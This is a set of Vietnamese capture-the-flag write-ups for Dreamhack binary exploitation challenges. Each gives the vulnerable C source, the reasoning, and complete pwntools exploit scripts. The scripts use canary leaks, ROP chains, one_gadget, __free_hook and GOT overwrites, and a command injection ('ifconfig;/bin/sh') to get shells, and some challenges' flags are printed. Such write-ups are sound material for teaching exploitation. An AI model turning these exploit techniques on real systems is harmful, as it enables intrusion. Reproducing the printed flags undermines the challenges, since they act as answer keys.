# sint

## Source

<details> <summary> Source </summary>

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void alarm_handler()
{
    puts("TIME OUT");
    exit(-1);
}

// void initialize()
// {
//     setvbuf(stdin, NULL, _IONBF, 0);
//     setvbuf(stdout, NULL, _IONBF, 0);

//     signal(SIGALRM, alarm_handler);
//     alarm(30);
// }

void get_shell()
{
    system("/bin/sh");
}

int main()
{
    char buf[256];
    int size;

    // initialize();

    signal(SIGSEGV, get_shell);

    printf("Size: ");
    scanf("%d", &size);
    printf("%d\n", size);
    if (size > 256 || size < 0)
    {
        printf("Buffer Overflow!\n");
        exit(0);
    }

    printf("Data: ");
    read(0, buf, size - 1);

    return 0;
}
```

<details>

## Ý tưởng

- Hướng đi của ta là sẽ gây lỗi `SIGSEGV` để thực thi shell, nghĩa là sẽ phải ow rip, gây lỗi `SIGSEGV`

- Sau một thời gian nghĩ và thảo luận với nhau thì ta thấy ở hàm tham số thứ 3 của hàm read là `size - 1` (Số lượng phần tử để đọc) thường là số dương, vậy nếu ta nhập số 0 và thì tham số thứ 3 mang giá trị âm. Vậy có gây lỗi không?
- Theo chat-gdb như sau

```
Nếu tham số nmemb có giá trị âm, hàm read() sẽ trả về -1 và đặt biến errno thành EINVAL, indicatinig một lỗi.
```

## Thực thi

- Đầu tiên khi được hỏi size thì ta sẽ trả lời 0
- Data: ta sẽ nhập thử 10 byte "a"

```
Size: 0
Data: qqqqqqqqqqqq
ls
```

- Chương trình lỗi nhưng chưa chiếm được shell, vì nếu nhập số lượng byte nhỏ hơn 256 của buf, chương trình chỉ nhận được lỗi `EINVAL` của read() mà ta chỉ chiếm được shell khi có lỗi `SIGSEGV`
- Vậy nên ta sẽ nhập cỡ 280 byte "a"

```
Size: 0
Data: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
ls
flag
sint
cat flag
DH{d66e84c453b960cfe37780e8ed9d70ab}
```

# Return_to_Library

## Source

<details> <summary> Source C </summary>

```c
// Name: rtl.c
// Compile: gcc -o rtl rtl.c -fno-PIE -no-pie

#include <stdio.h>
#include <unistd.h>

const char* binsh = "/bin/sh";

int main() {
  char buf[0x30];

  setvbuf(stdin, 0, _IONBF, 0);
  setvbuf(stdout, 0, _IONBF, 0);

  // Add system function to plt's entry
  system("echo 'system@plt");

  // Leak canary
  printf("[1] Leak Canary\n");
  printf("Buf: ");
  read(0, buf, 0x100);
  printf("Buf: %s\n", buf);

  // Overwrite return address
  printf("[2] Overwrite return address\n");
  printf("Buf: ");
  read(0, buf, 0x100);

  return 0;
}
```

</details>

## Ý tưởng

- Bài này không có hàm tạo shell nhưng cung cấp cho ta hàm system, chuỗi /bin/sh, ta hoàn toàn có thể tạo shell

```c
const char* binsh = "/bin/sh";
system("echo 'system@plt");
```

## Thực thi

- Đầu tiên chương trình có canary và yêu cầu ta leak, bài này tương tự như một bài trước đó, do %s in đến byte 0x00 sẽ ngừng in, nên nếu ghi đè đến trước canary, còn byte 0x00 của canary nên không in ra được
- Vậy, ta sẽ ghi đè byte 0x00 bằng byte 0x61, sau khi lấy được canary ta sẽ phải trừ đi 0x61 là byte ghi đè

![image](https://user-images.githubusercontent.com/111769169/227799702-bd49823a-54aa-4c51-b46d-398b62073c8a.png)

```python
payload = b"a"*57
r.sendafter(b"Buf: ", payload)
r.recvuntil(b"a" * 56)
canary = u64(r.recv(8))
canary = canary - 0x61
log.info("canary: " + hex(canary))
```

- Tiếp đó, ta sẽ sử dụng gadget `pop rdi và ret` để điều khiển chương trình, do chương trình cung cấp /bin/sh và system nên ta dễ dàng có được shell

```python
payload = b"a" * 56 + p64(canary)
payload += b"a" * 8 + p64(ret) + p64(pop_rdi)
payload += p64(next(exe.search(b'/bin/sh'))) + p64(exe.sym["system"])
r.sendafter(b"Buf: ", payload)
```

## Kết quả

![image](https://user-images.githubusercontent.com/111769169/227799897-578c6c6c-c248-45db-aeba-3cb06391686c.png)

<details> <summary> full script </summary>

```python
from pwn import *

exe = ELF("./rtl")
r = remote("host3.dreamhack.games", 15274)
# r = process(exe.path)
# gdb.attach(r, gdbscript='''
#            b*main+145
#            c
#            ''')
input()
pop_rdi = 0x0000000000400853
ret = 0x0000000000400285

payload = b"a"*57
r.sendafter(b"Buf: ", payload)
r.recvuntil(b"a" * 56)
canary = u64(r.recv(8))
canary = canary - 0x61
log.info("canary: " + hex(canary))

payload = b"a" * 56 + p64(canary)
payload += b"a" * 8 + p64(ret) + p64(pop_rdi)
payload += p64(next(exe.search(b'/bin/sh'))) + p64(exe.sym["system"])
r.sendafter(b"Buf: ", payload)

r.interactive()
```

</details>

# one_shot

## Source

<details> <summary> Source </summary>

```c
// gcc -o oneshot1 oneshot1.c -fno-stack-protector -fPIC -pie

#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(60);
}

int main(int argc, char *argv[]) {
    char msg[16];
    size_t check = 0;

    initialize();

    printf("stdout: %p\n", stdout);

    printf("MSG: ");
    read(0, msg, 46);

    if(check > 0) {
        exit(0);
    }

    printf("MSG: %s\n", msg);
    memset(msg, 0, sizeof(msg));
    return 0;
}
```

</details>

## Ý tưởng

- Bài này chủ yếu hướng dẫn chúng ta tạo shell bằng one_gadget, tuy nhiên chỉ khác một chút ở đây

```c
    if(check > 0) {
        exit(0);
    }
```

- Nó sẽ kiểm tra biến check, biến check trong stack `rbp-0x8`

![image](https://user-images.githubusercontent.com/111769169/227836552-a392aab4-4d25-4f8c-ad72-aa28b3a2188a.png)

- vậy ta sẽ ghi đè biến check là 0x0 để được ghi tiếp chương trình

## Thực thi

- Đầu tiên người ta cho chúng ta địa chỉ libc stdout
- Ta cần dựa vào địa chỉ đó để tính ra địa chỉ base libc

```python
    r.recvuntil(b"stdout: ")
    leak = int(r.recvline(keepends=False).decode(), 16)
    libc.address = leak - 3954208
    log.info("libc: " + hex(libc.address))
```

- Tiếp đó ta tìm gadget phù hợp ở đây em chọn gadget `0x45216`
- Cuối cùng tạo payload, lưu ý do check nằm sau 24 kí tự "a" nên ta cần trả về 0 để tiếp tục chương trình

```python
    payload = b"a" * 24 + p64(0) + b"a" * 8 + p64(libc.address + one_gadget)
    r.sendafter(b"MSG: ", payload)
```

## Kết quả

![image](https://user-images.githubusercontent.com/111769169/227837108-c5a3e799-f65a-433a-972d-806b5253b970.png)

<details> <summary> full script </summary>

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./oneshot_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.23.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        gdb.attach(r, gdbscript='''
                   b*main+138
                   b*main+102
                   c
                   ''')
    else:
        r = remote("host3.dreamhack.games", 17120)

    return r


def main():
    r = conn()
    input()
    r.recvuntil(b"stdout: ")
    leak = int(r.recvline(keepends=False).decode(), 16)
    libc.address = leak - 3954208
    log.info("libc: " + hex(libc.address))

    one_gadget = 0x45216
    payload = b"a" * 24 + p64(0) + b"a" * 8 + p64(libc.address + one_gadget)
    r.sendafter(b"MSG: ", payload)
    r.interactive()


if __name__ == "__main__":
    main()
```

</details>

# rop

## Source C

<details> <summary> Source C </summary>

```c
// Name: rop.c
// Compile: gcc -o rop rop.c -fno-PIE -no-pie

#include <stdio.h>
#include <unistd.h>

int main() {
  char buf[0x30];

  setvbuf(stdin, 0, _IONBF, 0);
  setvbuf(stdout, 0, _IONBF, 0);

  // Leak canary
  puts("[1] Leak Canary");
  printf("Buf: ");
  read(0, buf, 0x100);
  printf("Buf: %s\n", buf);

  // Do ROP
  puts("[2] Input ROP payload");
  printf("Buf: ");
  read(0, buf, 0x100);

  return 0;
}
```

</details>

## Ý tưởng

- Bài này tương tự như những bài trước, vẫn dùng ROPgadget, one_gadget để chiếm shell

## Thực thi

### Leak canary

- Bài này tương tự như các bài trước, ta sẽ ghi đè bài 0x00 của canary thành 0x61 để %s có thể ghi hết giá trị canary

- Sau đó ta trừ 0x61 để lấy lại giá trị đúng của canary

```python
    payload = b"a" * 57
    r.sendafter(b"Buf: ", payload)
    r.recvuntil(b"a" * 56)
    canary = u64(r.recv(8)) - 0x61
    log.info("canary: " + hex(canary))
```

- Sau đó ta trở về main để tiếp tục leak

```python
    payload = b"a" * 56 + p64(canary) + b"a"*8 + p64(exe.sym['main'] + 1)
    r.sendafter(b"Buf: ", payload)
```

### Leak địa chỉ libc

- Do là ta biết được giá trị canary nên lần leak này, ta sẽ ghi đè luôn cả canary trước rip

```python
    payload = b"a" * 56 + p64(canary) + b"a"*8 + p64(pop_rdi)
    payload += p64(exe.got['puts'])
    payload += p64(exe.plt['puts']) + p64(exe.sym['main'])
    r.sendafter(b"Buf: ", payload)
```

- Do lần nhập thứ nhất ta đã setup rồi nên lần nhập thứ 2 không quan trọng

```python
    r.recvuntil(b"a" * 56)
    r.sendafter(b"Buf: ", b"a")
```

- Tính địa chỉ base libc

```python
    leak_libc = u64(r.recvline(keepends=False) + b'\0\0')
    libc.address = leak_libc - 527008
    log.info("leak libc: " + hex(leak_libc))
    log.info("base libc: " + hex(libc.address))
```

### ow rip bằng one gadget

```python
    one_gadget = 0x4f432
    payload = b"a" * 56 + p64(canary) + p64(0) + p64(libc.address + one_gadget)
    r.sendafter(b"Buf: ", payload)
    r.recvuntil(b"a" * 56)
    r.sendafter(b"Buf: ", b"a")
```

## Kết quả

![image](https://user-images.githubusercontent.com/111769169/228313627-6b0e662b-7b87-4946-9e96-cd0fa4b6f20a.png)

<details> <summary> full script </summary>

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./rop_patched")
libc = ELF("./libc-2.27.so")
ld = ELF("./ld-2.27.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        gdb.attach(r, gdbscript='''
                    b*main+199
                    c
                    c
                    ''')
    else:
        r = remote("host3.dreamhack.games", 16829)

    return r


def main():
    r = conn()
    input()

    pop_rdi = 0x00000000004007f3
    payload = b"a" * 57
    r.sendafter(b"Buf: ", payload)
    r.recvuntil(b"a" * 56)
    canary = u64(r.recv(8)) - 0x61
    log.info("canary: " + hex(canary))

    payload = b"a" * 56 + p64(canary) + b"a"*8 + p64(exe.sym['main'] + 1)
    r.sendafter(b"Buf: ", payload)

    payload = b"a" * 56 + p64(canary) + b"a"*8 + p64(pop_rdi)
    payload += p64(exe.got['puts'])
    payload += p64(exe.plt['puts']) + p64(exe.sym['main'])
    r.sendafter(b"Buf: ", payload)
    r.recvuntil(b"a" * 56)
    r.sendafter(b"Buf: ", b"a")

    leak_libc = u64(r.recvline(keepends=False) + b'\0\0')
    libc.address = leak_libc - 527008
    log.info("leak libc: " + hex(leak_libc))
    log.info("base libc: " + hex(libc.address))

    one_gadget = 0x4f432
    payload = b"a" * 56 + p64(canary) + p64(0) + p64(libc.address + one_gadget)
    r.sendafter(b"Buf: ", payload)
    r.recvuntil(b"a" * 56)
    r.sendafter(b"Buf: ", b"a")

    r.interactive()


if __name__ == "__main__":
    main()
```

</details>

# hook

## Source

<details> <summary> source C </summary>

```c
// gcc -o init_fini_array init_fini_array.c -Wl,-z,norelro
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(60);
}

int main(int argc, char *argv[]) {
    long *ptr;
    size_t size;

    initialize();

    printf("stdout: %p\n", stdout);

    printf("Size: ");
    scanf("%ld", &size);

    ptr = malloc(size);

    printf("Data: ");
    read(0, ptr, size);

    *(long *)*ptr = *(ptr+1);

    free(ptr);
    free(ptr);

    system("/bin/sh");
    return 0;
}
```

</details>

## Ý tưởng

- Ở đây kĩ thuật này khá mới nên em chỉ hiểu sơ sơ là ta sẽ overwrite hàm free thành onegadget

## Thực thi

- Đầu tiên chương trình cho ta một địa chỉ libc của stdout, ta sẽ dựa vào địa chỉ đó để tính libc base

```python
libc_base = stdout - 3954208
free_hook = libc_base + 3958696
magic = libc_base + one_gadget
```

- Khi được hỏi về size chúng ta sẽ nhập size sao cho lớn hơn size payload của mình

## Kết quả

![image](https://user-images.githubusercontent.com/111769169/228539882-e6246e5c-dfa3-4990-a551-ce870f620118.png)

<details> <summary> Full script </summary>

```python
from pwn import *
p = remote("host2.dreamhack.games", 14428)
# p = process("./hook_patched")
# context.log_level = "debug"
# e = ELF("./hook_patched")
# libc = ELF("./libc.so.6")
# gdb.attach(p, gdbscript='''
#            b*main+158
#            b*main+128
#            c
#            ''')

input()
one_gadget = 0x4526a

p.recvuntil("stdout: ")
stdout = int(p.recv(14), 16)

libc_base = stdout - 3954208
free_hook = libc_base + 3958696
magic = libc_base + one_gadget
log.info(hex(libc_base) + " " + hex(free_hook))
payload = p64(free_hook) + p64(magic)

p.sendlineafter(b"Size: ", b"50")


p.sendlineafter(b"Data: ", payload)

p.interactive()
```

</details>

## Đọc thêm

- Trong hướng dẫn của dreamhack ngoài ghi đè free còn ghi đè `__malloc_hook`
- Khi thực thi thử `__malloc_hook` thì em thấy nó báo lỗi ở 2 hàm free()

```
b"*** Error in `./hook_patched': double free or corruption (fasttop): 0x000000000220a010 ***\n"
*** Error in `./hook_patched': double free or corruption (fasttop): 0x000000000220a010 ***
```

- Từ đây ta có thể đoán được nếu cuối chương trình có hai hàm free() ta nên ghi đè hàm free()

# off_by_one_001

## Source

<details> <summary> source </summary>

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void alarm_handler()
{
    puts("TIME OUT");
    exit(-1);
}

void initialize()
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

void read_str(char *ptr, int size)
{
    int len;
    len = read(0, ptr, size);
    printf("%d", len);
    ptr[len] = '\0';
}

void get_shell()
{
    system("/bin/sh");
}

int main()
{
    char name[20];
    int age = 1;

    initialize();

    printf("Name: ");
    read_str(name, 20);

    printf("Are you baby?");

    if (age == 0)
    {
        get_shell();
    }
    else
    {
        printf("Ok, chance: \n");
        read(0, name, 20);
    }

    return 0;
}
```

</details>

## Ý tưởng

- Ở đây chúng ta cần ghi đè biến age thành 0 để có thể chạy được shell
- Ta thấy mảng buf[20] nằm khá gần biến v5 là age của chúng ta

```c
  char buf[20]; // [esp+0h] [ebp-18h] BYREF
  int v5; // [esp+14h] [ebp-4h]
```

- Bằng một vài phép tính ta thấy khi ta nhập full 20 byte "a" thì byte thứ 21 sẽ ghi đè được v5

```
>>> -0x18 + 20
-4
```

- Mà ta nhớ rằng, hàm read() không đọc byte null, nghĩa là khi 20 kí tự nó sẽ đọc đúng 20 kí tự, nếu muốn sử dụng 20 kí tự ấy như một xâu kí tự thì ta sẽ phải thêm byte '\0' cuối chuỗi đó.
- Câu lệnh sau cho ta thấy nếu len là 20 thì `buf[20] = '\0'` trong khi buf khai báo buf[20] nhưng trên lí thuyết ta chỉ được sử dụng đến giá trị `buf[19] = 'a'`

```c
    ptr[len] = '\0';
```

## Thực thi

- Ta sẽ nhập vào một chuỗi kí tự 20 byte

## Kết quả

![image](https://user-images.githubusercontent.com/111769169/228557377-ca9363c4-9230-4525-92dd-43caaace88e6.png)

# off_by_one_000

## Ý tưởng

- Khi ta nhập 255 byte ta thấy ta đã overwrite 1 byte null vào ebp
- Giá trị ebp lại là một địa chỉ nào đó trong buf.

![image](https://user-images.githubusercontent.com/111769169/228569563-af23eebd-2ed1-432d-b082-4dd810e415e9.png)

- Địa chỉ stack là địa chỉ động nên ta sẽ tạo payload full địa chỉ get_shell để khi ow địa chỉ ebp, dù nhảy đến địa chỉ nào trong stack thì cũng là địa chỉ của get_shell

## Kết quả

![image](https://user-images.githubusercontent.com/111769169/228578127-a837e329-d6af-46bc-a5e1-c6059a08ff69.png)

<details> <summary> Source </summary>

```python
# form solve pwn đỡ phải viết script =)))
#!/usr/bin/env python3

from pwn import *

exe = ELF("./off_by_one_000")
# libc = ELF("./libc-2.27.so")
# ld = ELF("./ld-2.27.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        gdb.attach(r, gdbscript = '''
                   b*main+64
                   b*cpy+0
                   c
                   ''')
        input()
    else:
        r = remote("host3.dreamhack.games", 17014)

    return r


def main():
    r = conn()

    payload = p32(exe.sym['get_shell']) * (256 // 4)

    r.sendafter(b"Name: ", payload)
    r.interactive()


if __name__ == "__main__":
    main()
```

</details>

![image](https://user-images.githubusercontent.com/111769169/228579098-6c05078e-1adc-4ee6-af08-d7c4766b994b.png)

# cmd_center

## Source

<details> <summary> IDA </summary>

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  char buf[32]; // [rsp+0h] [rbp-130h] BYREF
  char s1[10]; // [rsp+20h] [rbp-110h] BYREF
  __int16 v5; // [rsp+2Ah] [rbp-106h]
  int v6; // [rsp+2Ch] [rbp-104h]
  char v7[240]; // [rsp+30h] [rbp-100h] BYREF
  _QWORD v8[2]; // [rsp+120h] [rbp-10h] BYREF

  v8[1] = __readfsqword(0x28u);
  strcpy(s1, "ifconfig");
  s1[9] = 0;
  v5 = 0;
  v6 = 0;
  memset(v7, 0, sizeof(v7));
  init(v8, argv, v7);
  printf("Center name: ");
  read(0, buf, 100uLL);
  if ( !strncmp(s1, "ifconfig", 8uLL) )
    system(s1);
  else
    puts("Something is wrong!");
  exit(0);
}
```

</details>

## Ý tưởng

- Ban đầu đọc source C khá lú nên ta coi ida cho nó chắc
- ta thấy lỗi BOF ở `read(0, buf, 100uLL);`, ở đây ta cần phải BOF để ghi đè vào s1 để có thể thoả hàm if để chạy `system(s1)`
- Đây là một số lệnh

![image](https://user-images.githubusercontent.com/111769169/228616963-888b11dc-cbff-488f-8dba-e586f3c572c1.png)
![image](https://user-images.githubusercontent.com/111769169/228617045-b3c47761-fd67-4ee4-a083-26c790367579.png)

- Ta sẽ sử dụng dấu `;` để có thể thực thi cả 2 câu lệnh, ifconfig và /bin/sh

## Thực thi

- Đầu tiên ta cần tính offset từ buf đến s1

```
>>> -0x130 -- 0x110
-32
```

- ow đến địa chỉ s1 ta sẽ nhập `ifconfig;/bin/sh`

## Kết quả

```
Center name: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaifconfig;/bin/sh
ls
cmd_center
flag
run.sh
cat flag
DH{f4c11bf9ea5a1df24175ee4d11da0d16}
```

# ssp_000

## Source

<details> <summary> source C </summary>

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>


void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}


void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

void get_shell() {
    system("/bin/sh");
}

int main(int argc, char *argv[]) {
    long addr;
    long value;
    char buf[0x40] = {};

    initialize();


    read(0, buf, 0x80);

    printf("Addr : ");
    scanf("%ld", &addr);
    printf("Value : ");
    scanf("%ld", &value);

    *(long *)addr = value;

    return 0;
}
```

</details>

## Ý tưởng

- Chương trình cho phép ta thay đổi dữ liệu của một địa chỉ
- Ta sẽ thay đổi `__stack_chk_fail` thành get_shell() (em tham khảo wu)
- Để có thể thay đổi được, ta sẽ ghi vào địa chỉ của `____stack_chk_fail` thành địa chỉ chỉ của get_shell()

## Thực thi

- Ta tính được offset từ đầu khi ghi đè canary là 80 ( vì nếu chương trình kiểm tra canary đã thay đổi thì nó sẽ thực thi `__stack_chk_fail`)
- Khi được hỏi địa chỉ thì ta sẽ ghi vào địa chỉ của `__stack_chk_fail@got` dưới dạng int
  và địa chỉ get_shell()

## Kết quả

```python
from pwn import *

exe = ELF("./ssp_000")
# libc = ELF("./libc-2.27.so")
# ld = ELF("./ld-2.27.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()

    r.sendline(b"a" * 80)
    r.sendlineafter(b"Addr : ", str(exe.got['__stack_chk_fail']))
    r.sendlineafter(b"Value : ", str(exe.sym['get_shell']))
    r.interactive()


if __name__ == "__main__":
    main()
```

![image](https://user-images.githubusercontent.com/111769169/228650651-ae36d4b8-16cd-4f8a-ad7b-a8a4a01c3f5e.png)

# fho

## source C

```c
// Name: fho.c
// Compile: gcc -o fho fho.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
  char buf[0x30];
  unsigned long long *addr;
  unsigned long long value;

  setvbuf(stdin, 0, _IONBF, 0);
  setvbuf(stdout, 0, _IONBF, 0);

  puts("[1] Stack buffer overflow");
  printf("Buf: ");
  read(0, buf, 0x100);
  printf("Buf: %s\n", buf);

  puts("[2] Arbitary-Address-Write");
  printf("To write: ");
  scanf("%llu", &addr);
  printf("With: ");
  scanf("%llu", &value);
  printf("[%p] = %llu\n", addr, value);
  *addr = value;

  puts("[3] Arbitrary-Address-Free");
  printf("To free: ");
  scanf("%llu", &addr);
  free(addr);

  return 0;
}
```

## Ý tưởng

- Bài này em có tham khảo một xíu
- Bài này không thể BOF được vì chúng ta chỉ có thể sử dụng 1 lần hàm read(), nếu sử dụng để leak canary thì không thể nào ret2libc
- Do đó mục tiêu của ta là thay đổi hàm nào đó
- Ở đây ta có chú ý có hàm free(), hàm free() chỉ có thể sử dụng trên địa chỉ động do malloc() tạo ra, nếu truy cập vào địa chỉ nào khác sẽ gây lỗi (theo chat-gdb)
- Ở đây ta sẽ dùng hook ow
- Ta sẽ dùng lần nhập thứ 2 để thay đổi địa chỉ hàm free() thành hàm system chẳng hạn
- Sau đó dùng lần nhập thứ 3 trỏ đến chuỗi /bin/sh
- Trên lí thuyết có thể là vậy

## Thực thi

### Leak libc

- Khi ta gdb và kiểm tra thì bên trên canary không có giá trị nào để ta có thể leak, do đó buộc phải leak libc, uy tín nhất là leak rip vì tỉ lệ đúng cao nhất

![image](https://user-images.githubusercontent.com/111769169/228671213-1ad3714b-63f6-49a9-bb26-1a7cc26ea3bc.png)

> tình hình là khi debug động thì có các giá trị lạ (có thể là rác) bên trong buf, còn debug thì sẽ giống như hình, do đó vẫn chọn rip để leak

- Tính offset

```python
    payload = b"a" * 72
    r.sendlineafter(b"Buf: ", payload)
    r.recvuntil(b"a" * 72)
    leak_libc = u64(r.recv(6) + b"\0\0")
    libc.address = leak_libc - 137994
    log.info("leak: " + hex(leak_libc))
    log.info("base: " + hex(libc.address))
```

- Kiểm tra, có đoạn 0x000 chắc là đúng r =)))

![image](https://user-images.githubusercontent.com/111769169/228674641-94732b7c-7b63-480b-bb07-7564268ea63d.png)

### Ghi đè free

- Tương tự như một vài bài trước, do chương trình cho phép ta sửa giá trị của một địa chỉ nên ta sẽ dựa vào đó để thay đổi got của free thành địa chỉ của system
- Do chương trình yêu cầu nhập vào số nguyên dương nên ta dùng str

```python
    payload = libc.sym['__free_hook']
    r.sendlineafter(b"To write: ", str(payload))
    payload = libc.sym['system']
    r.sendlineafter(b"With: ", str(payload))
```

### ghi /bin/sh

- do system và free đều chỉ sử dụng một thanh rdi để thực thi, nên ta sẽ ghi địa chỉ chuỗi /bin/sh trong file libc vào addr khi đó hàm free này đã trở thành system và nhận đối số là địa chỉ /bin/sh

```python
    payload = next(libc.search(b'/bin/sh'))
    r.sendlineafter(b"To free: ", str(payload))
    r.interactive()
```

## Kết quả

![image](https://user-images.githubusercontent.com/111769169/228676900-5f1a04b3-26cf-45b7-95a6-52914d17fcde.png)

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./fho_patched")
libc = ELF("./libc-2.27.so")
ld = ELF("./ld-2.27.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        gdb.attach(r, gdbscript='''
                   b*main+129
                   b*main+134
                   b*main+211
                   b*main+252
                   b*main+344
                   c
                   ''')
        input()
    else:
        r = remote("host3.dreamhack.games", 19902   )

    return r


def main():
    r = conn()

    payload = b"a" * 72
    r.sendlineafter(b"Buf: ", payload)
    r.recvuntil(b"a" * 72)
    leak_libc = u64(r.recv(6) + b"\0\0")
    libc.address = leak_libc - 137994
    log.info("leak: " + hex(leak_libc))
    log.info("base: " + hex(libc.address))

    payload = libc.sym['__free_hook']
    r.sendlineafter(b"To write: ", str(payload))
    payload = libc.sym['system']
    r.sendlineafter(b"With: ", str(payload))

    payload = next(libc.search(b'/bin/sh'))
    r.sendlineafter(b"To free: ", str(payload))
    r.interactive()


if __name__ == "__main__":
    main()
```
